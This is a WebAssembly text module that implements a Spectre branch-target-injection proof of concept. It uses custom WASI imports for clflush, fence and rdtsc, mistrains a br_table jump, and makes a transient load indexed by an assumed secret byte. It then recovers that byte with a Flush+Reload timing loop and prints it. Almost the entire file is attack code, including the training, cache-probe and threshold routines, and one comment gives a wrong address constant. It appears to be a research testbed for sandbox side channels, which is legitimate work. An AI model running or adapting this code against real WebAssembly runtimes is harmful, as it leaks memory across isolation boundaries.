;; basic out-of-place btb. The secret byte is 83("S")

;; linear memory usage:
;; [0, 12), [128, 140) - output parameter
;; [64, 72) - rdtsc timer

(module
  (type (;0;) (func (result i32)))
  (type (;1;) (func ))
  (type (;2;) (func (param i32) (result i32)))
  (type (;3;)$param32 (func (param i32)))
  (import "wasi_snapshot_preview1" "clflush_guestaddr" (func $__wasi_clflush_guestaddr (type 2)))
  (import "wasi_snapshot_preview1" "clflush_hostaddr" (func $__wasi_clflush_hostaddr (type 2)))
  (import "wasi_snapshot_preview1" "fence" (func $__wasi_fence (type 0)))
  (import "wasi_snapshot_preview1" "rdtsc" (func $__wasi_rdtsc (type 2))) ;;rdtsc expects a pointer-to-u64 and will write the tsc value to that location
  (import "wasi_unstable" "fd_write" (func $writef (param $fd i32) (param $iovec i32) (param $len i32) (param $written i32) (result i32)))
  (table (;0;) 3 anyfunc)
  (elem (i32.const 0) $trainTakenBranches $fread $flush)
  (memory (;0;) 2024 65535) ;; pages of 65536 bytes

;;    the real version, 10000 iterations
;;    (func $main (export "main") (local $total_times i32)(local $times i32)
;;     (set_local $total_times (i32.const 10000))
;;     (loop $L0
;;         (call $evict)
;;         (call $fence)
;;         (set_local $times (i32.const 100))
;;         (loop $L1
;;             (call $ftrain (i32.const 1))
;;             (set_local $times (i32.sub (get_local $times) (i32.const 1)))
;;             (br_if $L1 (get_local $times))
;;         )
;;         (set_local $times (i32.const 10))
;;         (loop $L2
;;             (call $evict) ;; flushing the branch table is a must
;;             (call $fread (i32.const 2))
;;             (call $exfiltrate)
;;             (drop)
;;             (set_local $times (i32.sub (get_local $times) (i32.const 1)))
;;             (br_if $L2 (get_local $times))
;;         )
;;         (set_local $total_times (i32.sub (get_local $total_times) (i32.const 1)))
;;         (br_if $L0 (get_local $total_times))
;;     )
;;   )

;;   the version to test cache measurement
;;   (func $main (export "main") (local $total_times i32)(local $times i32)
;;     (call $fread (i32.const 2))
;;     (call $exfiltrate)
;;     (drop)
;;   )

;;   the version to test memcpy, basically only do train-read everything once and hope to be lucky
    (func $main (export "main") (local $total_times i32)(local $times i32)
        (call $fence)
        (set_local $times (i32.const 100))
        (loop $L1
            (call $ftrain (i32.const 1))
            (set_local $times (i32.sub (get_local $times) (i32.const 1)))
            (br_if $L1 (get_local $times))
        )
        (i32.const 2)
        (i32.const 1)
        (call_indirect (type $param32))
        ;; (call $fread (i32.const 2))
        (call $exfiltrate)
        (drop)
    )

  ;; the training function needs to be careful to not touch(load) any linear memory
  (func $ftrain (export "ftrain") (param $br_index i32) (local $temp32 i32) (local $temp64 i64)
    (block
        ;; leave a signature on the BHB by doing enough taken conditional jumps. 35 seems to be good for both Ryzen and lakes
        ;; need to check if this gets compiled to taken branch by cranelift
        (i32.const 99)
        (i32.const 0)
        (call_indirect (type $param32))
        (block
            (block
                (block
                    (get_local $br_index)
                    (br_table 0 1 2 2)
                )
                (i32.store (i32.const 4096)(i32.const 4096))
            )
            ;; train the code to jump here (index 1)
            (i32.store (i32.const 4096)(i32.const 4096))
        )
        (get_local $br_index)
        (br_if 0 (i32.eq (i32.const 1)))
        ;; padding, should not be executed
    )
  )

  (func $noopfunc (export "noopfunc")
  )

  (func $fread (export "fread") (param $br_index i32)
    ;; identical to $ftrain up to the br_table
    (block
        (i32.const 99)
        (i32.const 0)
        (call_indirect (type $param32))
        (block
            (block
                (block
                    (get_local $br_index)
                    (br_table 0 1 2 2)
                )
                (i32.store (i32.const 4096)(i32.const 4096))
            )
            ;; transiently jump here
            (i32.load (i32.const 339968)) ;; 172032=83*4096; assume "S"(83) is the secret byte
            (i32.store (i32.const 83)) ;; just prevent optimization
        )
        ;; normal control flow to exit function
        (get_local $br_index)
        (br_if 0 (i32.eq (i32.const 2)))
        ;; prevent optimization
        (i32.store(i32.const 4096)(i32.const 1))
        ;; empty noopcall which will be patched by debugging to flush
        (call $noopfunc)
        (call $noopfunc)
    )
  )

  ;; /////////////////////////////////////////////////////
  ;; Helper Functions
  (func $exfiltrate (type 0) (local $start_time i64) (local $end_time i64) (local $duration i64) (local $loop_index i32) (local $mix_i i32) (local $memory_index i32) (local $possible_result i32) (local $threshold i64)
    ;;
    (set_local $threshold (call $getThreshold))
    (set_local $possible_result (i32.const 256)) ;; initialized as an impossible result
    (set_local $loop_index (i32.const 256))
    (loop $L0
        ;; avoid prefetch; mix_i = (i * 167 + 13) & 255 ; the first mix_i should be 102 for i=255, btw
        (set_local $loop_index (i32.sub (get_local $loop_index) (i32.const 1)))
        (get_local $loop_index)
        (i32.mul (i32.const 167))
        (i32.add (i32.const 13))
        (i32.and (i32.const 255))
        (set_local $mix_i)
        (get_local $mix_i)
        (i32.mul (i32.const 4096))
        (set_local $memory_index)
        (get_local $memory_index)
        (call $readTimer)
        (set_local $start_time)
        (i32.load)
        (drop)
        (call $readTimer)
        (set_local $end_time)
        (i64.sub (get_local $end_time) (get_local $start_time))
        (set_local $duration)
        (block
            (br_if 0 (i64.gt_u (get_local $duration) (get_local $threshold)))
            (call $output (get_local $mix_i))
            (set_local $possible_result (get_local $loop_index))
        )
        (call $flush (get_local $memory_index))
        (br_if $L0 (get_local $loop_index))
    )
    get_local $possible_result
  )

  (func $readTimer (result i64)
    ;; call timer primitive, return i64
    (call $__wasi_rdtsc (i32.const 64))
    (drop)
    (i64.load (i32.const 64))
  )

  (func $fence (type 1)
    ;; call fence primitive
    (call $__wasi_fence)
    (drop)
  )

  (func $flush (param $memory_index i32)
    ;; call flush primitive
    (call $__wasi_clflush_guestaddr (get_local $memory_index))
    (drop)
  )

  ;; the evict function doesn't work well: it caches something that negatively interferes with the secret, s.t. output is garbage
  (func $evict (local $loop_counter i32)
    ;; evict everything, primarily targeting the jump table (the ptr stored in the table entry)
    ;; primitive version, just load everything
    ;; (set_local $loop_counter (i32.const 1048579))
    ;; (loop $L0
    ;;     (set_local $loop_counter (i32.sub (get_local $loop_counter) (i32.const 1)))
    ;;     (get_local $loop_counter)
    ;;     (i32.mul (i32.const 64))
    ;;     (i64.load)
    ;;     (drop)
    ;;     (br_if $L0 (get_local $loop_counter))
    ;; )

    (set_local $loop_counter (i32.const 256))
    (loop $L1
        (set_local $loop_counter (i32.sub (get_local $loop_counter) (i32.const 1)))
        (call $flush (i32.mul (get_local $loop_counter) (i32.const 4096)))
        (br_if $L1 (get_local $loop_counter))
    )
  )

  (func $getThreshold (result i64) (local $loop_counter i32) (local $start_time i64) (local $end_time i64) (local $sum i64) (local $miss_time i64)
    ;; t_cachehit * 90% + t_cachemiss * 10%. Value below this threshold is considered cached access time
    (set_local $loop_counter (i32.const 1000))
    (set_local $sum (i64.const 0))
    (call $flush (i32.const 8192))
    (call $readTimer)
    (set_local $start_time)
    (i32.load (i32.const 8192))
    (drop)
    (call $readTimer)
    (set_local $end_time)
    (i64.sub (get_local $end_time) (get_local $start_time))
    (set_local $miss_time)
    (loop $L0
        (call $readTimer)
        (set_local $start_time)
        (i32.load (i32.const 8192))
        (drop)
        (call $readTimer)
        (set_local $end_time)
        (i64.sub (get_local $end_time) (get_local $start_time))
        (set_local $sum (i64.add (get_local $sum)))
        (set_local $loop_counter (i32.sub (get_local $loop_counter) (i32.const 1)))
        (br_if $L0 (get_local $loop_counter))
    )
    (i64.div_u (get_local $sum) (i64.const 1000))
    (i64.mul (i64.const 90))
    (get_local $miss_time)
    (i64.mul (i64.const 10))
    (i64.add)
    (i64.div_u (i64.const 100))
    (call $flush (i32.const 8192))
  )

  ;; just output a single byte, better give it some char printable
  (func $output (param $value i32)
    ;; the param is a printable byte
    i32.const 0
    i32.const 128
    i32.store ;; put the parameter pointer in the linear memory. We store the parameter at 128
    i32.const 128
    get_local $value
    i32.store ;; the parameter itself
    i32.const 132
    i32.const 10 ;; linefeed
    i32.store
    i32.const 136
    i32.const 0
    i32.store
    i32.const 4 ;; iov_len
    i32.const 2
    i32.store

    (call $writef (i32.const 1) (i32.const 0) (i32.const 1) (i32.const 8))
    (drop)
  )

  (func $trainTakenBranches (type 3) (param $taken_br_cond i32)
    ;; leave a signature on the BHB by doing enough taken conditional jumps. 35 seems to be good for both Ryzen and lakes
        ;; need to check if this gets compiled to taken branch by cranelift
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 0)))
            ;; just prevent optimization
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 1)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 2)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 3)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 4)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 5)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 6)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 7)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 8)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 9)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 10)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 11)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 12)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 13)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 14)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 15)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 16)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 17)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 18)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 19)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 20)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 21)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 22)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 23)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 24)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 25)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 26)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 27)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 28)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 29)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 30)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 31)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 32)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 33)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
        (block
            (br_if 0 (i32.ne (get_local $taken_br_cond) (i32.const 34)))
            (i32.const 41)
            (i32.store (i32.const 20))
        )
  )
  ;; /////////////////////////////////////////////////////


  (export "_start" (func $main)))
